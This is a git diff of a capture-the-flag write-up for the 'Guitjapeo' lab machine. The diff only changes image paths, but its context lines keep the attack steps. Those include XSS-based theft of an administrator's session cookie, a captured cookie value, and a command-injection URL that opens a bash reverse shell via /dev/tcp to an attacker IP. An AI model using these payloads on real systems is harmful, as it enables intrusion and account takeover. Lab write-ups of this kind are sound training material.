@@ -5,7 +5,7 @@ title: WriteUp Guitjapeo - TheHackersLabs
 slug: guitjapeo-writeup-thehackerslabs-en
 featured: false  
 draft: false  
-ogImage: "assets/guitjapeo/OpenGraph.png"  
+ogImage: "../../assets/images/guitjapeo/OpenGraph.png"  
 tags:
   - writeup
   - TheHackersLabs
@@ -21,7 +21,7 @@ lang: en
 
 CTF where we'll need to code, learn about git, and create a GitHub account.
 
-![alt text](/assets/guitjapeo/image.png)
+![alt text](../../assets/images/guitjapeo/image.png)
 
 I hope you find it enjoyable.
 
@@ -92,7 +92,7 @@ ff02::2         ip6-allrouters
 192.168.1.173   guitjapeo.thl
 ```
 
-![guitjapeo.thl](/assets/guitjapeo/image-1.png)
+![guitjapeo.thl](../../assets/images/guitjapeo/image-1.png)
 
 We scan this website.
 
@@ -135,11 +135,11 @@ Finished
 
 We enter `https://guitjapeo.thl/register` and create a user.
 
-![alt text](/assets/guitjapeo/image-2.png)
+![alt text](../../assets/images/guitjapeo/image-2.png)
 
 and validate our user at `https://guitjapeo.thl/login`. We manage to enter `https://guitjapeo.thl/messages`.
 
-![alt text](/assets/guitjapeo/image-3.png)
+![alt text](../../assets/images/guitjapeo/image-3.png)
 
 We see there's a kind of API where messages are sent, and a list of users is read among other things; we continue searching with gobuster in the API path.
 
@@ -179,7 +179,7 @@ Finished
 
 We find other interesting endpoints, visit the endpoint `/api/info` and it returns a JSON with headers.
 
-![alt text](/assets/guitjapeo/image-4.png)
+![alt text](../../assets/images/guitjapeo/image-4.png)
 
 ## Cookie Hijacking
 
@@ -187,11 +187,11 @@ In the message form, we can send a URL. It seems that in the dropdown menu, we c
 
 We first check by sending a URL with our machine's IP and a Python HTTP service.
 
-![alt text](/assets/guitjapeo/image-5.png)
+![alt text](../../assets/images/guitjapeo/image-5.png)
 
 It appears that the "Administrator" user is visiting all the links sent through the application. If we try to read the session cookie, we can't because it is set to "HttpOnly," which prevents reading the cookie from the browser; it can only be read from the server side.
 
-![alt text](/assets/guitjapeo/image-6.png)
+![alt text](../../assets/images/guitjapeo/image-6.png)
 
 This is solvable by using the `/api/info` endpoint, which allows us to read the headers, including the cookies.
 
@@ -274,7 +274,7 @@ https://guitjapeo.thl/?text=%3Cscript%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%
 
 ... and wait for them to click to receive their session cookie.
 
-![alt text](/assets/guitjapeo/image-8.png)
+![alt text](../../assets/images/guitjapeo/image-8.png)
 
 We decode the base64 and add the session data to our session from the browser.
 
@@ -285,7 +285,7 @@ connect.sid=s%3A9a5Nk7U822jJ8sTvZ0md_17zMdYZRhSK.WtnvPx1dWLKLv4lOr6OES1e0wb4osW%
 ```
 We refresh the page after modifying the cookie, and now we are logged in as the Administrator.
 
-![alt text](/assets/guitjapeo/image-9.png)
+![alt text](../../assets/images/guitjapeo/image-9.png)
 
 ## RCE
 
@@ -307,7 +307,7 @@ and add it to the URL as
 https://guitjapeo.thl/api/command/?cmd=require%28%27child_process%27%29.exec%28%27bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.116%2F12345%200%3E%261%22%27%29
 ```
 
-![alt text](/assets/guitjapeo/image-10.png)
+![alt text](../../assets/images/guitjapeo/image-10.png)
 
 We obtain a shell as the user lenam.
 
@@ -349,7 +349,7 @@ We find a `.git` folder, and we search if there's anything in the repository his
 git log --name-only --oneline
 ```
 
-![alt text](/assets/guitjapeo/image-11.png)
+![alt text](../../assets/images/guitjapeo/image-11.png)
 
 We find two files `archivo.zip` and `password.txt` that aren't in the application folder; we try to recover them.
 
@@ -599,7 +599,7 @@ User lenam may run the following commands on guitjapeo:
 
 We see that we can execute the command `git` (as it couldn't be any other way) as the user root.
 
-![alt text](/assets/guitjapeo/image-12.png)
+![alt text](../../assets/images/guitjapeo/image-12.png)
 
 In GTFOBins, we find this binary, which shows us some ways to use it to elevate privileges; some use the manual or help with `less`, which won't work because the git manuals are not installed.
 
